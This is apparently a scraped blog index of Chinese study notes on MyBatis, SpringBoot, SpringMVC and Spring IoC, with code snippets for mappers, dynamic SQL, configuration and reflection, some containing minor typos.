轻量级，性能出色 封装 JDBC SQL 和 Java 编码分开，功能边界清晰。Java 代码专注业务、SQL 语句专注数据 官网：https://mybatis.org/mybatis-3/zh/# 使用 创建SpringBoot工程、引入Mybatis相关依赖\n准备数据库表即对应实体类\n配置 Mybatis（在application.properties中数据库连接信息）\n编写 Mybatis 程序：编写 Mybatis 的持久层接口，定义 SQL（注解/XML）\n@Mapper：应用程序在运行时，会自动的为该接口创建一个实现类对象（代理对象），并且会自动将该实现类对象存入I0C容器 辅助配置 定义注解的语句为 MySQL 语法\nIDEA 连接数据库\n日志\n1 2 #配置mybatis的日志输出 mybatis.configuration.logimpl=org.apache.ibatis.logging.stdout.StdoutImpl 数据库连接池 数据库连接池是个容器，负责分配、管理数据库连接（Connection） 资源重用 允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个 提升系统响应速度 释放空闲时间超过最大空闲时间的连接，来避免因为没有释放连接而引起的数据库连接遗漏 避免数据库连接遗漏 1 2 3 4 5 6 // 引入德鲁伊连接池 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;druid-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.19\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; spring.datasource.type=com.alibaba.druid.pool.DruidDataSource\n底层实现 DataSource 接口\n操作 新增 1 2 @Insert(\u0026#34;insert insert(username,password,name,age) values (#{username},#{password},#{name},#{age})\u0026#34;) // 写的是对象属性名 public void insert(User user2); 删除 1 2 3 @Delete(\u0026#34;delete from user where id = #{id}\u0026#34;) public Integer deleteById(Integer id); // 可以返回影响的行数 修改 1 2 @Update(\u0026#34;update user set username=#{username}, password=#{password}, name=#{name}, age=#{age} where id=#{id}\u0026#34;) public void update(User user); 查询 1 2 @Select(\u0026#34;select * from user where username=#{username} and password=#{password}\u0026#34;) public User findByUsernameAndPassword(@Param(\u0026#34;username\u0026#34;) String username, @Param(\u0026#34;password\u0026#34;) String password); 有多个参数时，需要 @param 注解 XML 映射配置 默认规则：\nXML 映射文件的名称与 Mapper 接口名称一致，并且将 XML 映射文件和 Mapper 接口放置在相同包下（ resource 中同包同名）。\nXML 映射文件的 namespace 属性为 Mapper 接口全限定名一致。\n1 2 3 4 5 \u0026lt;mapper namespace=\u0026#34;com.itheima.mapper.UserMapper\u0026#34;\u0026gt; \u0026lt;select id=\u0026#34;findAll\u0026#34; resultType=\u0026#34;com.itheima.pojo.User\u0026#34;\u0026gt; select id，username，password，name，age from user \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; XML 映射文件中 sql 语句的 id 与 Mapper 接口中的方法名一致，并保持返回类型一致。 动态 SQL IF 1 2 3 4 5 6 7 8 9 \u0026lt;select id=\u0026#34;selectAllWebsite\u0026#34; resultMap=\u0026#34;myResult\u0026#34;\u0026gt; select id,name,url from website where 1=1 \u0026lt;if test=\u0026#34;name != null\u0026#34;\u0026gt; AND name like #{name} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;url!= null\u0026#34;\u0026gt; AND url like #{url} \u0026lt;/if\u0026gt; \u0026lt;/select\u0026gt; choose-when-otherwise 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;mapper namespace=\u0026#34;net.biancheng.mapper.WebsiteMapper\u0026#34;\u0026gt; \u0026lt;select id=\u0026#34;selectWebsite\u0026#34; parameterType=\u0026#34;net.biancheng.po.Website\u0026#34; resultType=\u0026#34;net.biancheng.po.Website\u0026#34;\u0026gt; SELECT id,name,url,age,country FROM website WHERE 1=1 \u0026lt;choose\u0026gt; \u0026lt;when test=\u0026#34;name != null and name !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; AND name LIKE CONCAT(\u0026#39;%\u0026#39;,#{name},\u0026#39;%\u0026#39;) \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;url != null and url !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; AND url LIKE CONCAT(\u0026#39;%\u0026#39;,#{url},\u0026#39;%\u0026#39;) \u0026lt;/when\u0026gt; \u0026lt;otherwise\u0026gt; AND age is not null \u0026lt;/otherwise\u0026gt; \u0026lt;/choose\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; 注意：AND 不能省！\nWHERE where 会检索语句，它会将 where 后的第一个 SQL 条件语句的 AND 或者 OR 关键词去掉。\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;select id=\u0026#34;selectWebsite\u0026#34; resultType=\u0026#34;net.biancheng.po.Website\u0026#34;\u0026gt; select id,name,url from website \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;name != null\u0026#34;\u0026gt; AND name like #{name} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;url!= null\u0026#34;\u0026gt; AND url like #{url} \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; SET set 标签可以为 SQL 语句动态的添加 set 关键字，剔除追加到条件末尾多余的逗号\n1 2 3 4 5 6 7 8 9 \u0026lt;update id=\u0026#34;updateWebsite\u0026#34; parameterType=\u0026#34;net.biancheng.po.Website\u0026#34;\u0026gt; UPDATE website \u0026lt;set\u0026gt; \u0026lt;if test=\u0026#34;name!=null\u0026#34;\u0026gt;name=#{name}\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;url!=null\u0026#34;\u0026gt;url=#{url}\u0026lt;/if\u0026gt; \u0026lt;/set\u0026gt; WHERE id=#{id} \u0026lt;/update\u0026gt; foreach foreach 标签用于循环语句，它很好的支持了数据和 List、set 接口的集合，并对此提供遍历的功能\n1 2 3 \u0026lt;foreach item=\u0026#34;item\u0026#34; index=\u0026#34;index\u0026#34; collection=\u0026#34;list|array|map key\u0026#34; open=\u0026#34;(\u0026#34; separator=\u0026#34;,\u0026#34; close=\u0026#34;)\u0026#34;\u0026gt; 参数值 \u0026lt;/foreach\u0026gt; foreach 标签主要有以下属性，说明如下。\nitem：表示集合中每一个元素进行迭代时的别名。 index：指定一个名字，表示在迭代过程中每次迭代到的位置。 open：表示该语句以什么开始（既然是 in 条件语句，所以必然以(开始）。 separator：表示在每次进行迭代之间以什么符号作为分隔符（既然是 in 条件语句，所以必然以,作为分隔符）。 close：表示该语句以什么结束（既然是 in 条件语句，所以必然以)开始）。 使用 foreach 标签时，最关键、最容易出错的是 collection 属性，该属性是必选的，但在不同情况下该属性的值是不一样的，主要有以下 3 种情况：\n如果传入的是单参数且参数类型是一个 List，collection 属性值为 list。 如果传入的是单参数且参数类型是一个 array 数组，collection 的属性值为 array。 如果传入的参数是多个，需要把它们封装成一个 Map，当然单参数也可以封装成 Map。Map 的 key 是参数名，collection 属性值是传入的 List 或 array 对象在自己封装的 Map 中的 key。 trim trim 一般用于去除 SQL 语句中多余的 AND 关键字、逗号，或者给 SQL 语句前拼接 where、set 等后缀，可用于选择性插入、更新、删除或者条件查询等操作\n1 2 3 \u0026lt;trim prefix=\u0026#34;前缀\u0026#34; suffix=\u0026#34;后缀\u0026#34; prefixOverrides=\u0026#34;忽略前缀字符\u0026#34; suffixOverrides=\u0026#34;忽略后缀字符\u0026#34;\u0026gt; SQL语句 \u0026lt;/trim\u0026gt; bind bind 标签可以通过 OGNL 表达式自定义一个上下文变量\n1 2 3 4 5 6 \u0026lt;select id=\u0026#34;selectWebsite\u0026#34; resultType=\u0026#34;net.biancheng.po.Website\u0026#34;\u0026gt; \u0026lt;bind name=\u0026#34;pattern\u0026#34; value=\u0026#34;\u0026#39;%\u0026#39;+_parameter+\u0026#39;%\u0026#39;\u0026#34; /\u0026gt; SELECT id,name,url,age,country FROM website WHERE name like #{pattern} \u0026lt;/select\u0026gt; 实现分页 使用 limit：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;select id=\u0026#34;selectWebsite\u0026#34; resultType=\u0026#34;net.biancheng.po.Website\u0026#34;\u0026gt; SELECT id,name,url,age,country FROM website \u0026lt;trim prefix=\u0026#34;where\u0026#34; prefixOverrides=\u0026#34;and\u0026#34;\u0026gt; \u0026lt;if test=\u0026#34;site.name != null and site.name !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; AND name LIKE CONCAT (\u0026#39;%\u0026#39;,#{site.name},\u0026#39;%\u0026#39;) \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;site.url!= null and site.url !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; AND url LIKE CONCAT (\u0026#39;%\u0026#39;,#{site.url},\u0026#39;%\u0026#39;) \u0026lt;/if\u0026gt; ORDER BY id limit #{from},#{pageSize} \u0026lt;/trim\u0026gt; \u0026lt;/select\u0026gt; 逆向工程 导入依赖： 1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis.generator\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-generator-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; config 文件夹下创建 genertorConfig.xml 文件，用于配置及指定数据库及表等 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE generatorConfiguration PUBLIC \u0026#34;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\u0026#34;\u0026gt; \u0026lt;generatorConfiguration\u0026gt; \u0026lt;context id=\u0026#34;DB2Tables\u0026#34; targetRuntime=\u0026#34;MyBatis3\u0026#34;\u0026gt; \u0026lt;commentGenerator\u0026gt; \u0026lt;!-- 是否去除自动生成的注释 --\u0026gt; \u0026lt;property name=\u0026#34;suppressAllComments\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/commentGenerator\u0026gt; \u0026lt;!-- Mysql数据库连接的信息：驱动类、连接地址、用户名、密码 --\u0026gt; \u0026lt;jdbcConnection driverClass=\u0026#34;com.mysql.jdbc.Driver\u0026#34; connectionURL=\u0026#34;jdbc:mysql://localhost:3306/test\u0026#34; userId=\u0026#34;root\u0026#34; password=\u0026#34;root\u0026#34; /\u0026gt; \u0026lt;!-- 默认为false，把JDBC DECIMAL 和NUMERIC类型解析为Integer，为true时 把JDBC DECIMAL 和NUMERIC类型解析为java.math.BigDecimal --\u0026gt; \u0026lt;javaTypeResolver\u0026gt; \u0026lt;property name=\u0026#34;forceBigDecimals\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;/javaTypeResolver\u0026gt; \u0026lt;!-- targetProject：生成POJO类的位置 --\u0026gt; \u0026lt;javaModelGenerator targetPackage=\u0026#34;net.biancheng.pojo\u0026#34; targetProject=\u0026#34;.\\src\u0026#34;\u0026gt; \u0026lt;!-- enableSubPackages:是否让schema作为包的后缀 --\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;!-- 从数据库返回的值被清理前后的空格 --\u0026gt; \u0026lt;property name=\u0026#34;trimStrings\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/javaModelGenerator\u0026gt; \u0026lt;!-- targetProject：mapper映射文件生成的位置 --\u0026gt; \u0026lt;sqlMapGenerator targetPackage=\u0026#34;net.biancheng.mapper\u0026#34; targetProject=\u0026#34;.\\src\u0026#34;\u0026gt; \u0026lt;!-- enableSubPackages:是否让schema作为包的后缀 --\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;/sqlMapGenerator\u0026gt; \u0026lt;!-- targetProject：mapper接口生成的的位置 --\u0026gt; \u0026lt;javaClientGenerator type=\u0026#34;XMLMAPPER\u0026#34; targetPackage=\u0026#34;net.biancheng.mapper\u0026#34; targetProject=\u0026#34;.\\src\u0026#34;\u0026gt; \u0026lt;!-- enableSubPackages:是否让schema作为包的后缀 --\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;/javaClientGenerator\u0026gt; \u0026lt;!-- 指定数据表 --\u0026gt; \u0026lt;table tableName=\u0026#34;website\u0026#34;\u0026gt;\u0026lt;/table\u0026gt; \u0026lt;table tableName=\u0026#34;student\u0026#34;\u0026gt;\u0026lt;/table\u0026gt; \u0026lt;table tableName=\u0026#34;studentcard\u0026#34;\u0026gt;\u0026lt;/table\u0026gt; \u0026lt;table tableName=\u0026#34;user\u0026#34;\u0026gt;\u0026lt;/table\u0026gt; \u0026lt;/context\u0026gt; \u0026lt;/generatorConfiguration\u0026gt; 创建 GeneratorSqlmap 类执行生成代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class GeneratorSqlmap { public void generator() throws Exception { List\u0026lt;String\u0026gt; warnings = new ArrayList\u0026lt;String\u0026gt;(); boolean overwrite = true; // 指定配置文件 File configFile = new File(\u0026#34;./config/generatorConfig.xml\u0026#34;); ConfigurationParser cp = new ConfigurationParser(warnings); Configuration config = cp.parseConfiguration(configFile); DefaultShellCallback callback = new DefaultShellCallback(overwrite); MyBatisGenerator myBatisGenerator = new MyBatisGenerator(config, callback, warnings); myBatisGenerator.generate(null); } // 执行main方法以生成代码 public static void main(String[] args) { try { GeneratorSqlmap generatorSqlmap = new GeneratorSqlmap(); generatorSqlmap.generator(); } catch (Exception e) { e.printStackTrace(); } } } ","date":"2025-10-12T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251012201626030.png","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-mybatis/","title":"Mybatis"},{"content":"SpringBoot 简介 设计目的：简化Spring应用的初始搭建以及开发过程\nSpring 程序缺点\n依赖设置繁琐 去除 spring-web 和 spring-webmvc 坐标 配置繁琐 SpringBoot 核心功能及优点：\n起步依赖（简化依赖配置）\n自动配置\n辅助功能（内置服务器）\nparent 管理版本 由 parent 帮助开发者统一的进行各种技术的版本管理\n只控制版本，不负责导入坐标 1 2 3 4 5 \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.5.4\u0026lt;/version\u0026gt; \u0026lt;/parent\u0026gt; starter 依赖组合 starter定义了使用某种技术时对于依赖的固定搭配格式，使用starter可以帮助开发者减少依赖配置。\n引导类 这个类在SpringBoot程序中是所有功能的入口，称为引导类，最典型的特征就是当前类上方声明了一个注解 @SpringBootApplication。\n用于启动程序 创建并初始化 Spring 容器 内嵌 Tomcat 整合到了：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-tomcat\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 基础配置 默认配置文件：application.properties，配置指定属性即可\n配置文件间的加载优先级 properties（最高）\u0026gt; yml \u0026gt; yaml（最低） 不同配置文件中相同配置按照加载优先级相互覆盖，不同配置文件中不同配置全部保留 指定SpringBoot配置文件\nSetting → Project Structure → Facets 选中对应项目/工程 Customize Spring Boot 选择配置文件 YML 数据读取 使用Spring中的注解 @Value读取单个数据\n1 2 @Value(\u0026#34;${server.port}\u0026#34;) private int port; 使用默认配置类 SpringBoot 提供了一个对象，能够把所有的数据都封装到这一个对象中，这个对象叫做 Environment，使用自动装配注解可以将所有的yaml数据封装到这个对象中\n1 2 3 4 @Autowired private Environment env; ... env.getProperty(\u0026#34;...\u0026#34;); 使用自定义配置类 SpringBoot 也提供了可以将一组 yaml 对象数据封装一个 Java 对象的操作\nenterprise 指定加载某一组 yaml 配置\n1 2 3 4 5 6 7 @Component @ConfigurationProperties(prefix = \u0026#34;enterprise\u0026#34;) public class Enterprise { private String name; private Integer age; private String[] subject; } 数据引用 1 2 3 4 5 6 baseDir: /usr/local/fire center: dataDir: ${baseDir}/data tmpDir: ${baseDir}/tmp logDir: ${baseDir}/log msgDir: ${baseDir}/msgDir SSMP 整合 JUnit 1 2 3 4 5 6 7 8 9 10 11 12 13 @SpringBootTest(classes = Springboot04JunitApplication.class) // @ContextConfiguration(classes = Springboot04JunitApplication.class) class Springboot04JunitApplicationTests { //注入你要测试的对象 @Autowired private BookDao bookDao; @Test void contextLoads() { //执行要测试的对象对应的方法 bookDao.save(); System.out.println(\u0026#34;two...\u0026#34;); } } Mybatis 在配置、引入依赖时已经整合\n1 2 3 4 5 @Mapper public interface BookDao { @Select(\u0026#34;select * from tbl_book where id = #{id}\u0026#34;) public Book getById(Integer id); } 1 2 3 4 5 6 7 #2.配置相关信息 spring: datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=Asia/Shanghai username: root password: root Mybatis-plus 需要用阿里云的 url 导入\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.baomidou\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-plus-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.4.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 配置所有数据库表名的前缀名：\n1 2 3 4 mybatis-plus: global-config: db-config: table-prefix: tbl_\t#设置所有表的通用前缀名称为tbl_ 其他 Lombok 简化POJO实体类开发，SpringBoot 目前默认集成了 lombok 技术\n可以通过一个注解@Data完成一个实体类对应的getter，setter，toString，equals，hashCode等操作的快速添加 1 2 3 4 5 6 7 \u0026lt;dependencies\u0026gt; \u0026lt;!--lombok--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.projectlombok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lombok\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; ","date":"2025-10-12T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251012171949620.png","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-springboot%E5%AE%9E%E7%94%A8%E6%95%99%E7%A8%8B/","title":"SpringBoot"},{"content":"Spring MVC 主要覆盖表述层（Controller）\n简化接收前端参数、响应前端数据 工作流程 接收数据 路径设置 RequestMapping(\u0026quot;path\u0026quot;) 注解\nGetMapping(\u0026quot;...\u0026quot;)\n\u0026hellip;\u0026hellip;\n接收参数 param 参数名和 param 名相同，直接接收\n注解接收 RequestParam(value = \u0026quot;...\u0026quot;,required = \u0026quot;...\u0026quot;)\n多字符串，直接用集合接收\n必须要注解 封装为对象接收\n属性名必须等于参数名 路径传参 1 2 3 4 @RequestMapping(\u0026#34;{account}/{password}\u0026#34;) public String login(@PathVariable String account,@PathVariable String password){ return null; } Json 参数 定义接收的实体类 用 RequestBody 接收 原生 Java 不支持接收 Json\nhandlerMapper 中配置 Json 转换器，EnableWebMVC 用于给RequestMappingHandLerMapping、RequestMappingHandLerAdapter 添加Json处理器 Cookie @CookieValue\n存 Cookie：\n1 2 3 4 5 public String save(HttpServletResponse response){ Cookie cookie = new Cookie(name:\u0026#34;cookiellame\u0026#34;, value:\u0026#34;root\u0026#34;); response.addCookie(cookie); return \u0026#34;ok\u0026#34;; } 请求头 @RequestHeader\n原生 API 对象 共享域对象 Session、ServletContext\n原生获取 SpringMVC 提供\nmodel modeLMap map modeLAndView 响应数据 前后端不分离 不用 ResponseBody，配置 Jsp 模板地址，返回\n转发 return \u0026quot;forward:/jsp/...\u0026quot;\n返回 Json 直接 return User，会被自动封装\n需要 @ResponseBody 注解，不会走视图转换器 ResponseBody + Controller = RestController 返回静态资源 需要配置 Config\n1 2 3 4 5 6 7 //开启静态资源查找 //dispatcherServLet-\u0026gt;handLerMapping找有没有对应的handLer-\u0026gt;【没有-\u0026gt;找有没有静态资源】 @Override public void configurelDefaultServletHandling(DefaultServletHandlerConfigurer configurer）{ configurer.enable(); } Restful 风格 规定路径设计方式、参数传递格式、选择请求方式\n风格特点 每一个URI代表1种资源；\n客户端使用GET、POST、PUT、DELETE4个表示操作方式的动词对服务端资源进行操作：GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT用来更新资 源，DELETE用来删除资源；\n资源的表现形式是XML或者JSON；\n客户端与服务端之间的交互在请求之间是无状态的，从客户端到服务端的每个请求都必须包含理解请求所必需的信息。\n用请求方式 + URI 来表示操作、对象 路径传参：对应单一资源，如 id 其他扩展 全局异常处理 异常处理分类\n编程式：单独细化处理 声明式：统一处理 1 2 3 4 5 6 7 8 9 10 11 //全局异常发生，会走此类写的handLer！ //@ControLLerAdvice//可以返回逻辑视图转发和重定向的！ no usages @RestControllerAdvice//@ResponseBody直接返回json字符串 public class GlobalExceptionHandler{ //发生异常-\u0026gt;ControLLerAdvice注解的类型-\u0026gt;@ExceptionHandLer（指定的异常）-\u0026gt;handLer no usages @ExceptionHandler(ArithmeticException.class) public ObjectArithmeticExceptionHandler(ArithmeticException e){ //自定义处理异常即可handLer } 拦截器 HandlerIntercepter\n拦截器 Springmvc VS 过滤器 javaWeb:\n相似点 拦截: 必须先把请求拦住，才能执行后续操作 过滤: 拦截器或过滤器存在的意义就是对请求进行统一处理 放行: 对请求执行了必要操作后，放请求过去，让它访问原本想要访问的资源 不同点 工作平台不同 过滤器工作在 Servlet 容器中 拦截器工作在 SpringMVC 的基础上 拦截的范围 过滤器: 能够拦截到的最大范围是整个 Web 应用 拦截器: 能够拦截到的最大范围是整个 SpringMVC 负责的请求 IOC 容器支持 过滤器: 想得到 IOC 容器需要调用专门的工具方法，是间接的 拦截器: 它自己就在 IOC 容器中，所以可以直接从 IOC 容器中装配组件，也就是可以直接得到 IOC 容器的支持 使用 实现 HandlerInterceptor 接口\n修改类配置拦截器 SpringMvcConfig impLements WebMvcConfigurer\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 配置拦截 publicvoid addInterceptors(InterceptorRegistry registry){ //配置方案1：拦截全部请求 registry.addInterceptor(new MyInterceptor()); //配置方案2：指定地址拦截.addPathPatterns（\u0026#34;/user/data\u0026#34;);； //*任意一层字符串**任意多层字符串 registry.addInterceptor(new MyInterceptor()) .addPathPatterns(\u0026#34;/user/**\u0026#34;); //配置方案3：排除拦截排除的地址应该在拦截地址内部！ registry.addInterceptor(new MyInterceptor()) .addPathPatterns(\u0026#34;/user/**\u0026#34;).excludePathPatterns(\u0026#34;/user/data1\u0026#34;); } 参数校验 hybernate 框架实现\n非空校验 @Validate\nNotNull：包装类型不为 null NotEmpty：集合类型长度大于 0 NotBlank：字符串不为 null，且不为 \u0026quot;\u0026quot; 通过 BindingResult 绑定错误，不直接返回\n","date":"2025-10-12T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-springmvc/","title":"SpringMVC"},{"content":"概述 Spring FrameWork 特点 非侵入式 控制反转 面向切面编程 容器化管理 组件化 一站式 IOC 控制反转 概述 Inversion of Control\n用容器管理所有 Java 对象的实例化和初始化，控制依赖关系，称为 SpringBean xml 配置文件\n抽象 BeanDefinitionReader 读取\n装配，读取信息，利用反射实例化\nBeanFactory、ApplicationContex 用 Context.getBean(\u0026quot;...\u0026quot;) 来获取\n基于 xml 管理 获取 Bean xml 定义\n1 \u0026lt;bean id=\u0026#34;helloworldone\u0026#34; class=\u0026#34;ccom.atguigu.spring6.bean.He11owor1d\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; Context.getBean(\u0026quot;...\u0026quot;) 获取\n1 2 //根据类型获取接口对应bean UserDaouserDao= context.getBean(UserDao.class); 依赖注入 set 注入 xml 中进行配置 构造器注入 \u0026lt;constructor-arggname=\u0026quot;bnamevalue=\u0026quot;java开发\u0026quot;\u0026gt;\u0026lt;/constructor-arg\u0026gt; 是不是只能注入默认值？\n特殊值注入\n对象中注入其他对象（表示关系） 法一：引入外部/内部类，bean 标签中嵌套 ref 法二：级联赋值，直接嵌套对所注入的对象的属性的赋值 数组类型注入\n配置中的 \u0026lt;array\u0026gt;标签 List 集合属性注入\n先定义 Bean，再用 \u0026lt;list\u0026gt; 标签注入 map 集合属性注入\n\u0026lt;map\u0026gt;\u0026lt;entry\u0026gt;\u0026lt;key\u0026gt; 标签 引用集合类型（？util 整合）\np 命名空间注入\n防止 7.中的util 的名称冲突 引入外部属性 创建外部属性文件 .property\nxml 中配置读取即可\n作用域 配置 scope 来指定作用域\nsingleton 单例 prototype 多例，每次获取时创建 生命周期 FactoryBean 机制 根据接口实现 FactoryBean，自定义 getObjet（）方法返回值，来控制产生的对象\n用于整合第三方框架(?) 基于注解注解管理 开启组件扫描 1 2 \u0026lt;!--开启组件扫描功能--\u0026gt; \u0026lt;context:component-scanbase-package=\u0026#34;com.atguigu.spring6\u0026#34;\u0026gt;\u0026lt;/context:component-scan\u0026gt; 注解说明 @Autowired 注入 set 方法注入 1 2 3 4 @Autowired public void setUserService(UserService userService) { this.userService = userService; } 构造方法注入\n形参上注入\n根据名称进行注入（而非接口名）\n一个接口有多个实现类时 @Qualifier @Resource 注入 默认根据 name 标签进行注入\n全注解开发 无需使用配置文件，写一个配置类替代配置文件\n1 2 3 4 5 @configuration //@componentscan({\u0026#34;com.atguigu.spring6.controller\u0026#34; //\u0026#34;com.atguigu.spring6.service\u0026#34;,\u0026#34;com.atguigu.spring6.dao\u0026#34;}) @componentscan(\u0026#34;com.atguigu.spring6\u0026#34;) public class Spring6config {} 手写 IoC 反射 获取对象： 1 2 3 4 5 6 7 8 9 10 public void test01(）{ //1 类名.cLass Class clazz1 = Car.class; //2 对象.getCLass() Class clazz2 =newv Car().getclass(); //3 CLass.forName（\u0026#34;全路径\u0026#34;） Class clazz3 = Class.forName( className: \u0026#34;......\u0026#34;); //实例化 Object o = clazz3.getDeclaredConstructor().newInstance(); } 获取方法： 1 2 3 4 5 6 7 8 public void test02() throws Exception { Classclazz = Car.class; 1/获取所有构造 Constructor[]] constructors = clazz.getconstructors(); for (Constructor c:constructors) {......} // 方法名：c.getname() 参数个数(public)：c.getConstructor() // 参数个数(所有)：c.getDeclaredConstructor() } 构造对象： 1 2 3 Constructorc2=（clazz.getDeclaredConstructor(......) c2.setAccessible(true); Car car2 = (Car)c2.newInstance( ..initargs: \u0026#34;捷达\u0026#34;， 15,“白色\u0026#34;); 获取属性： 1 2 3 4 5 6 7 8 Classclazz = Car.class; //获取所有pubLic属性 Field[] fields = clazz.getFields(); //获取所有属性（包含私有属性） Field[] fields = clazz.getDeclaredFields(); for (Field field:fields）{ System.out.println(field.getName()); } 操作方法 1 2 3 4 5 6 7 8 private方法 Method[] methodsAll = clazz.getDeclaredMethods(); for (Method m:methodsAll) { //执行方法 runI if(m.getName().equals(\u0026#34;run\u0026#34;)) { m.setAccessible(true); m.invoke(car) ; } 实现 步骤 创建注解：@Bean创建对象、@Di属性注入\n创建bean容器接口：ApplicationContext\n定义方法，返回对象\n实现bean容器接口：返回对象、根据包规则加载bean\n配置 @Bean\n1 2 3 4 @Target(ElementType.TYPE) // 目标 @Retention(RetentionPolicy.RUNTIME) // 运行范围 public @interface Bean } @Di\nApplicationCotext 接口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 //创建有参数构造，传递包路径，设置包扫描规则 //扫描当前包及其子包，哪个类有@Bean注解，把这个类通过反射实例化 public AnnotationApplicationContext implement ApplicationContext(String basePackage) { // 路径转义,点替换为斜杠 String packagePath = basePackage.replaceAll(\u0026#34;\\\\.\u0026#34;,\u0026#34;\\\\\\\\\u0026#34;) // 获取绝对路径 Enumeration\u0026lt;URL\u0026gt; urls = Thread.currentThread().getContextClassLoader()·getResources(packagePath); while(urls.hasMoreElements()) { URL url = urls.nextElement(); String filePath= URLDecoder.decode(url.getFile(), \u0026#34;utf-8\u0026#34;); loadBean(new File(filePath)); // 实现 loadBean 方法 } loadDi(); // 实现 loadDi 方法 } public static void loadBean(File file){ // 1.判断当前内容是否是文件夹 // 2.是，则获取当前文件夹所有内容 // 3.文件夹为空，返回空 // 4.文件夹不为空，遍历文件夹所有内容 // 4.1.遍历每个File对象，继续判断，如果还是文件，递归 // 4.2.不是文件夹，是文件 // 4.3.得到包文件 + 类名称部分 // 4.4.判断当前文件类型是否.cLass // 4.5.如果是.cLass类型，把路径\\替换成。把.cLass去掉 // 4.6.判断类上面是否有注解@Bean，如果有实例化过程 // 4.7.把对象实例化之后，放到map集合bearFactory } private void loadDi() { //实例化对象在beanFactory的map集合里面 //1遍历beanFactory的map集合 //2获取map集合每个对象（vaLue），每个对象属性获取到 //3遍历得到每个对象属性数组，得到每个属性 //4判断属性上面是否有@Di注解 //5如果有@Di注解，把对象进行设置（注入） } AOP 面向切面 引入 问题：\n要抽取的代码在方法内部，无法通过抽取到父类解决 